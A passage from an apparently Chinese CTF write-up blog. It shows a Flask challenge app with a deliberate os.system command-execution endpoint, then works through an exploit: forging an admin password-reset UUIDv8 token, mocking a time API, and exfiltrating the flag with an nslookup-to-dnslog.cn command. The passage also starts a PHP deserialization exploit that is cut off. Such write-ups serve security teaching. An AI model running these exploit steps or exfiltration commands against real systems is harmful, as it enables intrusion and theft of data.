class="hljs-string">&#x27;date&#x27;</span>)<br>        <span class="hljs-keyword">if</span> datetime_str:<br>            <span class="hljs-built_in">print</span>(datetime_str)<br>            current_time = datetime.fromisoformat(datetime_str)<br>            <span class="hljs-keyword">return</span> current_time.year &gt;= <span class="hljs-number">2066</span><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;home.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/server_info&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">server_info</span>():<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&#x27;server_start_time&#x27;</span>: SERVER_START_TIME,<br>        <span class="hljs-string">&#x27;current_time&#x27;</span>: time.time()<br>    &#125;<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        email = request.form.get(<span class="hljs-string">&#x27;email&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        confirm_password = request.form.get(<span class="hljs-string">&#x27;confirm_password&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> password != confirm_password:<br>            flash(<span class="hljs-string">&#x27;密码错误&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br><br>        existing_user = User.query.filter_by(username=username).first()<br>        <span class="hljs-keyword">if</span> existing_user:<br>            flash(<span class="hljs-string">&#x27;已经存在这个用户了&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br><br>        existing_email = User.query.filter_by(email=email).first()<br>        <span class="hljs-keyword">if</span> existing_email:<br>            flash(<span class="hljs-string">&#x27;这个邮箱已经被注册了&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br><br>        hashed_password = generate_password_hash(password)<br>        new_user = User(username=username, email=email, password=hashed_password)<br>        db.session.add(new_user)<br>        db.session.commit()<br><br>        flash(<span class="hljs-string">&#x27;注册成功，请登录&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>        password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br><br>        user = User.query.filter_by(username=username).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">and</span> check_password_hash(user.password, password):<br>            session[<span class="hljs-string">&#x27;user_id&#x27;</span>] = user.<span class="hljs-built_in">id</span><br>            session[<span class="hljs-string">&#x27;username&#x27;</span>] = user.username<br>            session[<span class="hljs-string">&#x27;is_admin&#x27;</span>] = user.is_admin<br>            flash(<span class="hljs-string">&#x27;登陆成功，欢迎!&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;用户名或密码错误!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">logout</span>():<br>    session.clear()<br>    flash(<span class="hljs-string">&#x27;成功登出&#x27;</span>, <span class="hljs-string">&#x27;info&#x27;</span>)<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;home&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/dashboard&#x27;</span></span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dashboard</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;dashboard.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/forgot_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forgot_password</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        email = request.form.get(<span class="hljs-string">&#x27;email&#x27;</span>)<br>        user = User.query.filter_by(email=email).first()<br>        <span class="hljs-keyword">if</span> user:<br>            <span class="hljs-comment"># 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span><br>            <span class="hljs-comment"># UUID v8吧，看起来版本比较新</span><br>            token = <span class="hljs-built_in">str</span>(uuid.uuid8(a=padding(user.username))) <span class="hljs-comment"># 可以自定义参数吗原来，那把username放进去吧</span><br>            reset_token = PasswordResetToken(user_id=user.<span class="hljs-built_in">id</span>, token=token)<br>            db.session.add(reset_token)<br>            db.session.commit()<br>            <span class="hljs-comment"># TODO：写一个SMTP服务把token发出去</span><br>            flash(<span class="hljs-string">f&#x27;密码恢复token已经发送，请检查你的邮箱&#x27;</span>, <span class="hljs-string">&#x27;info&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;reset_password&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;没有找到该邮箱对应的注册账户&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;forgot_password&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;forgot_password.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/reset_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reset_password</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        token = request.form.get(<span class="hljs-string">&#x27;token&#x27;</span>)<br>        new_password = request.form.get(<span class="hljs-string">&#x27;new_password&#x27;</span>)<br>        confirm_password = request.form.get(<span class="hljs-string">&#x27;confirm_password&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> new_password != confirm_password:<br>            flash(<span class="hljs-string">&#x27;密码不匹配&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;reset_password&#x27;</span>))<br><br>        reset_token = PasswordResetToken.query.filter_by(token=token, used=<span class="hljs-literal">False</span>).first()<br>        <span class="hljs-keyword">if</span> reset_token:<br>            user = User.query.get(reset_token.user_id)<br>            user.password = generate_password_hash(new_password)<br>            reset_token.used = <span class="hljs-literal">True</span><br>            db.session.commit()<br>            flash(<span class="hljs-string">&#x27;成功重置密码！请重新登录&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;无效或过期的token&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;reset_password&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;reset_password.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/execute_command&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-meta">@login_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">execute_command</span>():<br>    result = check_time_api()<br>    <span class="hljs-keyword">if</span> result <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        flash(<span class="hljs-string">&quot;API死了啦，都你害的啦。&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> result:<br>        flash(<span class="hljs-string">&#x27;2066年才完工哈，你可以穿越到2066年看看&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;dashboard&#x27;</span>))<br><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        command = request.form.get(<span class="hljs-string">&#x27;command&#x27;</span>)<br>        os.system(command) <span class="hljs-comment"># 什么？你说安全？不是，都说了还没完工催什么。</span><br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;execute_command&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;execute_command.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/settings&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-meta">@admin_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_settings</span>():<br>    user = User.query.get(session[<span class="hljs-string">&#x27;user_id&#x27;</span>])<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        new_api = request.form.get(<span class="hljs-string">&#x27;time_api&#x27;</span>)<br>        user.time_api = new_api<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;成功更新API！&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin_settings&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_settings.html&#x27;</span>, time_api=user.time_api)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">False</span>, host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h2><p>可以看到附件里注释还挺多，尤其是在uuidv8那里</p><p>先看一眼整体题目</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250816200723-8qmuci6.png" alt="image"></p><p>还是先注册一个用户成功登录，点击执行命令让我穿越到2066年</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>(db.Model):<br>    <span class="hljs-built_in">id</span> = db.Column(db.Integer, primary_key=<span class="hljs-literal">True</span>)<br>    username = db.Column(db.String(<span class="hljs-number">20</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    email = db.Column(db.String(<span class="hljs-number">120</span>), unique=<span class="hljs-literal">True</span>, nullable=<span class="hljs-literal">False</span>)<br>    password = db.Column(db.String(<span class="hljs-number">60</span>), nullable=<span class="hljs-literal">False</span>)<br>    is_admin = db.Column(db.Boolean, default=<span class="hljs-literal">False</span>)<br>    time_api = db.Column(db.String(<span class="hljs-number">200</span>), default=<span class="hljs-string">&#x27;https://api.uuni.cn//api/time&#x27;</span>)<br></code></pre></td></tr></table></figure><p>找到了调用时间的api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/admin/settings&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-meta">@admin_required</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">admin_settings</span>():<br>    user = User.query.get(session[<span class="hljs-string">&#x27;user_id&#x27;</span>])<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        new_api = request.form.get(<span class="hljs-string">&#x27;time_api&#x27;</span>)<br>        user.time_api = new_api<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;成功更新API！&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;admin_settings&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin_settings.html&#x27;</span>, time_api=user.time_api)<br></code></pre></td></tr></table></figure><p>管理员可以进行更改api</p><p>所以现在就是要伪造admin</p><p>有忘记密码的api</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/forgot_password&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forgot_password</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        email = request.form.get(<span class="hljs-string">&#x27;email&#x27;</span>)<br>        user = User.query.filter_by(email=email).first()<br>        <span class="hljs-keyword">if</span> user:<br>            <span class="hljs-comment"># 选哪个UUID版本好呢，好头疼 &gt;_&lt;</span><br>            <span class="hljs-comment"># UUID v8吧，看起来版本比较新</span><br>            token = <span class="hljs-built_in">str</span>(uuid.uuid8(a=padding(user.username))) <span class="hljs-comment"># 可以自定义参数吗原来，那把username放进去吧</span><br>            reset_token = PasswordResetToken(user_id=user.<span class="hljs-built_in">id</span>, token=token)<br>            db.session.add(reset_token)<br>            db.session.commit()<br>            <span class="hljs-comment"># TODO：写一个SMTP服务把token发出去</span><br>            flash(<span class="hljs-string">f&#x27;密码恢复token已经发送，请检查你的邮箱&#x27;</span>, <span class="hljs-string">&#x27;info&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;reset_password&#x27;</span>))<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;没有找到该邮箱对应的注册账户&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;forgot_password&#x27;</span>))<br><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;forgot_password.html&#x27;</span>)<br></code></pre></td></tr></table></figure><p>token与uuid v8有关，去网上搜索一下，直接命中搜到了出题人的博客</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18921150">https://www.cnblogs.com/LAMENTXU/articles/18921150</a></p><p>​<code>fetch(&#39;/server_info&#39;).then(r=&gt;r.json()).then(console.log)</code>​</p><p>{current_time: 1755347387.967356, server_start_time: 1755390699.0612564}</p><p>先忘记密码，向邮箱发送token</p><p>python3.14运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">username: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>    b = username.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    b = (b[:<span class="hljs-number">6</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(b) &gt; <span class="hljs-number">6</span> <span class="hljs-keyword">else</span> b.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(b, <span class="hljs-string">&#x27;big&#x27;</span>)<br><br>seed = <span class="hljs-number">1755390699.0612564</span><br>username = <span class="hljs-string">&quot;admin&quot;</span><br><br>random.seed(seed)<br>a_val = padding(username)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;padding: <span class="hljs-subst">&#123;a_val&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(uuid.uuid8(a=a_val)))<br></code></pre></td></tr></table></figure><p>再将生成的token重置密码</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817090231-17t8obg.png" alt="image"></p><p>用<a href="https://app.beeceptor.com/">https://app.beeceptor.com/</a>生成一个api返回</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;<br>  <span class="hljs-string">&quot;date&quot;</span>: <span class="hljs-string">&quot;2066-01-01T00:00:00&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817091850-78i9dw1.png" alt="image"></p><p>成功进入命令执行界面</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817092127-0kuywl8.png" alt="image"></p><p>无回现，用<a href="http://dnslog.cn/">http://dnslog.cn/</a>进行外带</p><p>​<code>nslookup $(cat /flag).yourdomain.dnslog.cn</code>​</p><p><img src="https://raw.githubusercontent.com/Dre4m017/Pic/main/Pic/image-20250817092805-1ueh6l5.png" alt="image"></p><h1 id="Your-Uns3r"><a href="#Your-Uns3r" class="headerlink" title="Your Uns3r"></a>Your Uns3r</h1><h2 id="题目附件-2"><a href="#题目附件-2" class="headerlink" title="题目附件"></a>题目附件</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">exec</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;value)));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ser</span> != <span class="hljs-variable language_">$this</span>-&gt;value &amp;&amp; <span class="hljs-variable">$ser</span> <span class="hljs-keyword">instanceof</span> Access) &#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-variable">$ser</span>-&gt;<span class="hljs-title function_ invoke__">getToken</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;username == <span class="hljs-string">&quot;admin&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">exec</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Access</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$prefix</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$suffix</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getToken</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;prefix) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;suffix)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Go to HELL!&quot;</span>);<br>        &#125;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable language_">$this</span>-&gt;prefix . <span class="hljs-string">&#x27;lilctf&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;suffix;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;pearcmd&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Can I have peachcmd?&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;admin&#x27;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;Access&quot;:&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span> (<span class="hljs-string">&quot;no way!!!!&quot;</span>);<br>&#125;<br><br><span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$ser</span>);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;nonono!!!&quot;</span>);<br></code></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>​<code>getToken()</code>​函数</p><p><strong>把两段字符串拼成一个文件路径，并做两道黑名单检查，然后把这个路径返回给调用者。</strong></p><ul><li>最终路径格式一定是：<br>​<code>&lt;prefix&gt;lilctf&lt;suffix&gt;</code>​</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$result</span>, <span class="hljs-string">&#x27;pearcmd&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;Can I have peachcmd?&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果 $result 里包含子串 ‘pearcmd’，就抛异常。<br>这是为了阻止直接利用类似 pearcmd.php 的已知文件包含点。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ser</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;admin&#x27;</span>) !== <span class="hljs-literal">false</span> &amp;&amp; <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$ser</span>, <span class="hljs-string">&#x27;Access&quot;:&#x27;</span>) !== <span class="hljs-literal">false</span>) &#123;<br>    <span class="hljs-keyword">exit</span> (<span class="hljs-string">&quot;no way!!!!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>黑名单，弱比较绕过</p><p>所以目前已知的部分exp可以写成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$value</span>;<br>    &#125;<br><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Access</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&#x27;/&#x27;</span>;<br>        <span class="hljs-keyword">protected</span> <span 